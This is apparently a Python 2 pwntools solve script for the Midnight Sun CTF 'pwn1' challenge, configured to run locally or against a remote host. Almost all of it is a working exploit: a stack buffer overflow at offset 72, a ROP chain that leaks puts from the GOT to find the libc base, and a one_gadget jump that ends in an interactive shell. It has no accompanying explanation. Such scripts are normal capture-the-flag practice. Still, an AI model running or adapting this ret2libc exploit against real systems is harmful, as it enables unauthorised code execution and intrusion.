#!/usr/bin/env python2
​
"""
Run exploit locally with:
./solve.py
​
Run against remote with:
./solve.py REMOTE HOST=pwn1-01.play.midnightsunctf.se PORT=10001
"""
​
from pwn import *
​
PROG_PATH = './pwn1'
RIP_OFFSET = 72
​
PUTS_PLT = 0x40054c
PUTS_GOT = 0x602018
MAIN_FUNC = 0x400698
POP_RDI = 0x400783
​
​
def init_pwntools_context():
    context.binary = PROG_PATH
    context.terminal = ['tmux', 'vsplit', '-h']
​
    if not args['REMOTE']:
        context.log_level = 'debug'
​
​
def init_io():
    if args['REMOTE']:
        libc = ELF('libc.so')
        libc.symbols['one_gadget'] = 0x4f322
        io = remote(args['HOST'], int(args['PORT']))
    else:
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        libc.symbols['one_gadget'] = 0xe652b
        pty = process.PTY
        io = process(PROG_PATH, stdin=pty, stdout=pty, stderr=pty)
​
    return libc, io
​
​
def leak_libc_puts(io):
    log.info('Leaking libc base address...')
​
    payload = ''
    payload += 'A' * RIP_OFFSET
    payload += p64(POP_RDI)
    payload += p64(PUTS_GOT)
    payload += p64(PUTS_PLT)
    payload += p64(MAIN_FUNC)
​
    io.sendlineafter('buffer: ', payload)
    raw_resp = io.recvline().rstrip()
    puts_addr = u64(raw_resp.ljust(8, '\x00'))
    return puts_addr
​
​
def win(libc, io):
    leaked_puts = leak_libc_puts(io)
    libc.address = leaked_puts - libc.symbols['puts']
    log.info('Leaked libc base address of 0x%x' % libc.address)
​
    payload = 'A' * RIP_OFFSET
    payload += p64(libc.symbols['one_gadget'])
    payload += '\x00' * 0x60
    io.sendlineafter('buffer: ', payload)
    io.interactive()
​
​
if __name__ == '__main__':
    init_pwntools_context()
    libc, io = init_io()
    win(libc, io)